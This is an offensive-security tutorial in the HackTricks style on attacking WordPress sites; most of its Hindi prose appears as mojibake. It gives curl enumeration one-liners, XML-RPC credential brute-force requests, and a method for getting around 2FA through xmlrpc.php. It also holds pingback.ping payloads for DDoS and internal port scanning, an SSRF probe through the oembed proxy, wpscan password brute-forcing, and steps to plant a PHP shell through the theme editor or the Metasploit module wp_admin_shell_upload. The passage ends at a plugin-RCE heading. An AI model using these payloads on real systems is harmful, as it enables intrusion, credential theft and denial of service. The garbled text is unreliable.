# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## рдмреБрдирд┐рдпрд╛рджреА рдЬрд╛рдирдХрд╛рд░реА

- **Uploaded** рдлрд╝рд╛рдЗрд▓реЗрдВ рдЬрд╛рддреА рд╣реИрдВ: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рдЖрдк theme рдХреЗ рдХреБрдЫ php рдмрджрд▓рдХрд░ RCE рдкрд╛рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдЖрдк рд╕рдВрднрд╡рддрдГ рдЙрд╕ path рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: Using **theme twentytwelve** рдЖрдк **404.php** рдлрд╝рд╛рдЗрд▓ рдХреЛ access рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- In **wp-config.php** рдЖрдк database рдХрд╛ root password рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред
- рдЬрд╛рдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд▓реЙрдЧрд┐рди рдкрд╛рде: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` рдореЗрдВ рдЙрдкрдпреЛрдЧреА рдЬрд╛рдирдХрд╛рд░реА рд╣реЛрддреА рд╣реИ рдЬреИрд╕реЗ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд┐рдП рдЧрдП WordPress рдХрд╛ рд╕рдВрд╕реНрдХрд░рдгред
- `wp-activate.php` рдХрд╛ рдЙрдкрдпреЛрдЧ рдирдП WordPress рд╕рд╛рдЗрдЯ рд╕реЗрдЯрдЕрдк рдХрд░рддреЗ рд╕рдордп рдИрдореЗрд▓ рдПрдХреНрдЯрд┐рд╡реЗрд╢рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
- Login рдлрд╝реЛрд▓реНрдбрд░ (рдЫреБрдкрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдирд╛рдо рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ):
  - `/wp-admin/login.php`
  - `/wp-admin/wp-login.php`
  - `/login.php`
  - `/wp-login.php`
- `xmlrpc.php` рдПрдХ рдРрд╕реА рдлрд╝рд╛рдЗрд▓ рд╣реИ рдЬреЛ WordPress рдХреА рдЙрд╕ рдлреАрдЪрд░ рдХрд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХрд░рддреА рд╣реИ рдЬреЛ рдбреЗрдЯрд╛ рдЯреНрд░рд╛рдВрд╕рдорд┐рдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП HTTP рдХреЛ transport mechanism рдФрд░ XML рдХреЛ encoding mechanism рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИред рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХрд╛ рд╕рдВрдЪрд╛рд░ рдЕрдм WordPress рдХреЗ [REST API](https://developer.wordpress.org/rest-api/reference) рджреНрд╡рд╛рд░рд╛ рдкреНрд░рддрд┐рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рдЪреБрдХрд╛ рд╣реИред
- `wp-content` рдлрд╝реЛрд▓реНрдбрд░ рд╡рд╣ рдореБрдЦреНрдп рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рд╣реИ рдЬрд╣рд╛рдБ plugins рдФрд░ themes рд╕реНрдЯреЛрд░ рд╣реЛрддреЗ рд╣реИрдВред
- `wp-content/uploads/` рд╡рд╣ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рд╣реИ рдЬрд╣рд╛рдБ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдкрд░ рдЕрдкрд▓реЛрдб рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓реЗрдВ рд╕реНрдЯреЛрд░ рд╣реЛрддреА рд╣реИрдВред
- `wp-includes/` рд╡рд╣ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рд╣реИ рдЬрд╣рд╛рдБ core рдлрд╝рд╛рдЗрд▓реЗрдВ рд╕реНрдЯреЛрд░ рд╣реЛрддреА рд╣реИрдВ, рдЬреИрд╕реЗ certificates, fonts, JavaScript рдлрд╝рд╛рдЗрд▓реЗрдВ рдФрд░ widgetsред
- `wp-sitemap.xml` WordPress рд╕рдВрд╕реНрдХрд░рдг 5.5 рдФрд░ рдЙрд╕рд╕реЗ рдКрдкрд░ рдореЗрдВ, WordPress рд╕рднреА рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ posts рдФрд░ publicly queryable post types рдФрд░ taxonomies рдХреЗ рд╕рд╛рде рдПрдХ sitemap XML рдлрд╝рд╛рдЗрд▓ рдЬреЗрдирд░реЗрдЯ рдХрд░рддрд╛ рд╣реИред

**Post exploitation**

- `wp-config.php` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╡рд╣ рдЬрд╛рдирдХрд╛рд░реА рд╣реЛрддреА рд╣реИ рдЬреЛ WordPress рдХреЛ database рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЪрд╛рд╣рд┐рдП, рдЬреИрд╕реЗ database рдХрд╛ рдирд╛рдо, database host, username рдФрд░ password, authentication keys рдФрд░ salts, рдФрд░ database table prefixред рдпрд╣ configuration рдлрд╝рд╛рдЗрд▓ DEBUG mode рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ, рдЬреЛ troubleshooting рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддреА рд╣реИред

### Users Permissions

- **Administrator**
- **Editor**: рдкреЛрд╕реНрдЯ рдкреНрд░рдХрд╛рд╢рд┐рдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЕрдкрдиреЗ рддрдерд╛ рджреВрд╕рд░реЛрдВ рдХреЗ рдкреЛрд╕реНрдЯреНрд╕ рдХрд╛ рдкреНрд░рдмрдВрдзрди рдХрд░рддрд╛ рд╣реИред
- **Author**: рдЕрдкрдиреЗ рдкреЛрд╕реНрдЯ рдкреНрд░рдХрд╛рд╢рд┐рдд рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рддрд╛ рд╣реИред
- **Contributor**: рдЕрдкрдиреЗ рдкреЛрд╕реНрдЯ рд▓рд┐рдЦрддрд╛ рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рдЙрдиреНрд╣реЗрдВ рдкреНрд░рдХрд╛рд╢рд┐рдд рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ред
- **Subscriber**: рдкреЛрд╕реНрдЯ рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЕрдкрдиреА рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

## **Passive Enumeration**

### **Get WordPress version**

рдЬрд╛рдБрдЪреЗрдВ рдХреНрдпрд╛ рдЖрдк `/license.txt` рдпрд╛ `/readme.html` рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ

рдкреЗрдЬ рдХреЗ **source code** рдХреЗ рдЕрдВрджрд░ (рдЙрджрд╛рд╣рд░рдг рд╕реЗ: [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS рд▓рд┐рдВрдХ рдлрд╛рдЗрд▓реЗрдВ

![](<../../images/image (533).png>)

- JavaScript рдлрд╛рдЗрд▓реЗрдВ

![](<../../images/image (524).png>)

### рдкреНрд▓рдЧрдЗрдиреНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### рдереАрдо рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рд╕рдВрд╕реНрдХрд░рдг рдирд┐рдХрд╛рд▓рдирд╛
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## рд╕рдХреНрд░рд┐рдп рдПрдиреБрдореЗрд░реЗрд╢рди

### Plugins and Themes

рдЖрдк рд╕рдВрднрд╡рддрдГ рд╕рднреА Plugins рдФрд░ Themes рдвреВрдВрдв рдкрд╛рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реЛрдВрдЧреЗред рд╕рднреА рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ **рд╕рдХреНрд░рд┐рдп рд░реВрдк рд╕реЗ Plugins рдФрд░ Themes рдХреА рд╕реВрдЪреА рдкрд░ Brute Force рдХрд░рдирд╛** рд╣реЛрдЧрд╛ (рдЖрд╢рд╛ рд╣реИ рд╣рдорд╛рд░реЗ рд▓рд┐рдП рдХреБрдЫ automated tools рд╣реИрдВ рдЬрд┐рдирдореЗрдВ рдпреЗ lists рдореМрдЬреВрдж рд╣реИрдВ)ред

### Users

- **ID Brute:** рдЖрдк WordPress рд╕рд╛рдЗрдЯ рд╕реЗ рд╡реИрдз users рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ users IDs рдкрд░ Brute Forcing рдХрд░рдХреЗ:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
рдпрджрд┐ responses **200** рдпрд╛ **30X** рд╣реИрдВ, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ id **valid** рд╣реИред рдЕрдЧрд░ response **400** рд╣реИ, рддреЛ id **invalid** рд╣реИред

- **wp-json:** рдЖрдк users рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП query рдХрд░рдХреЗ рднреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
рдПрдХ рдЕрдиреНрдп `/wp-json/` endpoint рдЬреЛ users рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреБрдЫ рдЬрд╛рдирдХрд╛рд░реА рдЙрдЬрд╛рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ endpoint рдХреЗрд╡рд▓ рдЙрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд░рддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЛрдВрдиреЗ рдкреЛрд╕реНрдЯ рдХреА рд╣реИред **рдХреЗрд╡рд▓ рдЙрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рджрд╛рди рдХреА рдЬрд╛рдПрдЧреА рдЬрд┐рдирдХреЗ рд▓рд┐рдП рдпрд╣ рдлреАрдЪрд░ рд╕рдХреНрд╖рдо рд╣реИред**

рдпрд╣ рднреА рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **/wp-json/wp/v2/pages** could leak IP addresses.

- **Login username enumeration**: **`/wp-login.php`** рдкрд░ рд▓реЙрдЧрд┐рди рдХрд░рддреЗ рд╕рдордп **message** **different** рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ рд╕рдВрдХреЗрдд рджреЗрддрд╛ рд╣реИ рдХрд┐ **username exists or not**ред

### XML-RPC

рдпрджрд┐ `xml-rpc.php` рд╕рдХреНрд░рд┐рдп рд╣реИ рддреЛ рдЖрдк credentials brute-force рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдЕрдиреНрдп resources рдкрд░ DoS attacks рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред (рдЖрдк рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ[ using this](https://github.com/relarizky/wpxploit) рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП automate рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред

рдпрд╣ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдпрд╣ рд╕рдХреНрд░рд┐рдп рд╣реИ рдпрд╛ рдирд╣реАрдВ, _**/xmlrpc.php**_ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ рдФрд░ рдпрд╣ request рднреЗрдЬреЗрдВ:

**рдЬрд╛рдБрдЪ рдХрд░реЗрдВ**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** рдпрд╛ **`metaWeblog.getUsersBlogs`** рдРрд╕реЗ рдХреБрдЫ рддрд░реАрдХреЗ рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ credentials рдХреЛ brute-force рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрджрд┐ рдЖрдк рдЗрдирдореЗрдВ рд╕реЗ рдХреЛрдИ рдвреВрдВрдв рд▓реЗрддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
рд╕рдВрджреЗрд╢ _"Incorrect username or password"_ 200 рдХреЛрдб рд░рд┐рд╕реНрдкреЙрдиреНрд╕ рдХреЗ рдЕрдВрджрд░ рджрд┐рдЦрд╛рдИ рджреЗрдирд╛ рдЪрд╛рд╣рд┐рдП рдЕрдЧрд░ credentials рдорд╛рдиреНрдп рдирд╣реАрдВ рд╣реИрдВред

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

рд╕рд╣реА credentials рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдПрдХ рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд░рд┐рд╕реНрдкреЙрдиреНрд╕ рдореЗрдВ path рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛ ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛ рдПрдХ рддреЗрдЬрд╝ рддрд░реАрдХрд╛ рднреА рд╣реИ brute-force credentials рдХрд░рдиреЗ рдХрд╛ тАФ **`system.multicall`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ тАФ рдХреНрдпреЛрдВрдХрд┐ рдЖрдк рдПрдХ рд╣реА request рдкрд░ рдХрдИ credentials рдЖрдЬрдорд╛ рд╕рдХрддреЗ рд╣реИрдВ:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

рдпрд╣ рддрд░реАрдХрд╛ programs рдХреЗ рд▓рд┐рдП рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ humans рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ, рддрдерд╛ рдкреБрд░рд╛рдирд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ 2FA рдХреЛ рд╕рдкреЛрд░реНрдЯ рдирд╣реАрдВ рдХрд░рддрд╛ред рдЗрд╕рд▓рд┐рдП, рдЕрдЧрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ valid creds рд╣реИрдВ рдкрд░ рдореБрдЦреНрдп рдкреНрд░рд╡реЗрд╢ 2FA рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ, рддреЛ **рдЖрдк xmlrpc.php рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрди creds рд╕реЗ 2FA рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рддреЗ рд╣реБрдП login рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдк console рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЬреЛ рд╕рднреА actions рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд╡реЗ рд╕рдм рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реЛрдВрдЧреЗ, рдкрд░ рдлрд┐рд░ рднреА рдЖрдк RCE рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕рд╛ Ippsec рдиреЗ [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) рдореЗрдВ рд╕рдордЭрд╛рдпрд╛ рд╣реИред

**DDoS or port scanning**

рдЕрдЧрд░ рдЖрдк list рдХреЗ рдЕрдВрджрд░ _**pingback.ping**_ method рдвреВрдБрдв рд▓реЗрддреЗ рд╣реИрдВ рддреЛ рдЖрдк Wordpress рдХреЛ рдХрд┐рд╕реА рднреА host/port рдкрд░ arbitrary request рднреЗрдЬрд╡рд╛ рд╕рдХрддреЗ рд╣реИрдВ.\
рдпрд╣ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ **рд╣рдЬрд╛рд░реЛрдВ** Wordpress **рд╕рд╛рдЗрдЯреНрд╕** рдХреЛ рдПрдХ рд╣реА **location** рдХреЛ **access** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рдХрд░ (рдЗрд╕ рддрд░рд╣ рдЙрд╕ location рдореЗрдВ рдПрдХ **DDoS** рдЙрддреНрдкрдиреНрди рд╣реЛрддрд╛ рд╣реИ) рдпрд╛ рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ internal **network** рдХреЗ рдХреБрдЫ рд╣рд┐рд╕реНрд╕реЗ рдХреЛ **scan** рдХрд░рд╡рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЖрдк рдХреЛрдИ рднреА port рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

рдпрджрд┐ рдЖрдкрдХреЛ **faultCode** рдХрд╛ рдорд╛рди **0** (17) рд╕реЗ **рдмрдбрд╝рд╛** рдорд┐рд▓рддрд╛ рд╣реИ, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рдкреЛрд░реНрдЯ рдЦреБрд▓рд╛ рд╣реИред

рдкрд┐рдЫрд▓реЗ рд╕реЗрдХреНрд╢рди рдореЗрдВ **`system.multicall`** рдХреЗ рдЙрдкрдпреЛрдЧ рдХреЛ рджреЗрдЦреЗрдВ рддрд╛рдХрд┐ рдЖрдк рд╕реАрдЦ рд╕рдХреЗрдВ рдХрд┐ рдЗрд╕ рдореЗрдердб рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреИрд╕реЗ DDoS рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

рдпрд╣ рдлрд╝рд╛рдЗрд▓ рдЖрдорддреМрд░ рдкрд░ Wordpress рд╕рд╛рдЗрдЯ рдХреЗ рд░реВрдЯ рдореЗрдВ рдореМрдЬреВрдж рд╣реЛрддреА рд╣реИ: **`/wp-cron.php`**\
рдЬрдм рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рддрдХ **рдкрд╣реБрдВрдЪ** рдХреА рдЬрд╛рддреА рд╣реИ рддреЛ рдПрдХ "**рднрд╛рд░реА**" MySQL **query** рдХреА рдЬрд╛рддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЗрд╕реЗ **attackers** рджреНрд╡рд╛рд░рд╛ **DoS** рдкреИрджрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ `wp-cron.php` рдХреЛ рд╣рд░ рдкреЗрдЬ рд▓реЛрдб рдкрд░ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЬрдм рдХреЛрдИ рдХреНрд▓рд╛рдЗрдВрдЯ рдХрд┐рд╕реА рднреА Wordpress рдкреЗрдЬ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рддрд╛ рд╣реИ), рдЬреЛ рд╣рд╛рдИ-рдЯреНрд░реИрдлрд┐рдХ рд╕рд╛рдЗрдЯреНрд╕ рдкрд░ рд╕рдорд╕реНрдпрд╛рдПрдБ (DoS) рдкреИрджрд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдпрд╣ рд╕реБрдЭрд╛рд╡ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ Wp-Cron рдХреЛ disable рдХрд░реЗрдВ рдФрд░ host рдХреЗ рдЕрдВрджрд░ рдПрдХ рд╡рд╛рд╕реНрддрд╡рд┐рдХ cronjob рдмрдирд╛рдХрд░ рдЖрд╡рд╢реНрдпрдХ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдирд┐рдпрдорд┐рдд рдЕрдВрддрд░рд╛рд▓ рдкрд░ рдЪрд▓рд╛рдПрдБ (рдмрд┐рдирд╛ рд╕рдорд╕реНрдпрд╛рдПрдБ рдкреИрджрд╛ рдХрд┐рдП)ред

### /wp-json/oembed/1.0/proxy - SSRF

рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ рдХрд┐ _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ рддрдХ рдкрд╣реБрдБрдЪреЗ рдФрд░ Worpress рд╕рд╛рдЗрдЯ рдЖрдк рдкрд░ рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддреА рд╣реИред

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

рдпрд╣ рдЯреВрд▓ рдЬрд╛рдВрдЪрддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ **methodName: pingback.ping** рдФрд░ рдкрд╛рде **/wp-json/oembed/1.0/proxy** рдореМрдЬреВрдж рд╣реИрдВ, рдФрд░ рдЕрдЧрд░ рдореМрдЬреВрдж рд╣реЛрдВ рддреЛ рдпрд╣ рдЙрдиреНрд╣реЗрдВ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИред

## Automatic Tools
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## рдПрдХ рдмрд┐рдЯ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдХреЗ рдПрдХреНрд╕реЗрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

рдпрд╣ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╣рдорд▓рд╛ рд╣реЛрдиреЗ рдХреЗ рдмрдЬрд╛рдп рдПрдХ рдЬрд┐рдЬреНрдЮрд╛рд╕рд╛ рд╣реИред CTF рдореЗрдВ [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) рдЖрдк рдХрд┐рд╕реА рднреА wordpress рдлрд╝рд╛рдЗрд▓ рдХрд╛ 1 bit рдкрд▓рдЯ рд╕рдХрддреЗ рдереЗред рдЗрд╕рд▓рд┐рдП рдЖрдк рдлрд╝рд╛рдЗрд▓ `/var/www/html/wp-includes/user.php` рдХреЗ position `5389` рдкрд░ рд╕реНрдерд┐рдд рдмрд┐рдЯ рдХреЛ рдкрд▓рдЯрдХрд░ NOT (`!`) рдСрдкрд░реЗрд╢рди рдХреЛ NOP рдХрд░ рд╕рдХрддреЗ рдереЗред
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **рдкреИрдирд▓ RCE**

**рдереАрдо рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП php рдХреЛ рдореЙрдбрд┐рдлрд╛рдЗ рдХрд░рдирд╛ (admin credentials needed)**

Appearance тЖТ Theme Editor тЖТ 404 Template (at the right)

Change the content for a php shell:

![](<../../images/image (384).png>)

Search in internet how can you access that updated page. In this case you have to access here: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

You can use:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
рдПрдХ session рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

## рдкреНрд▓рдЧрдЗрди RCE

### PHP рдкреНрд▓рдЧрдЗрди

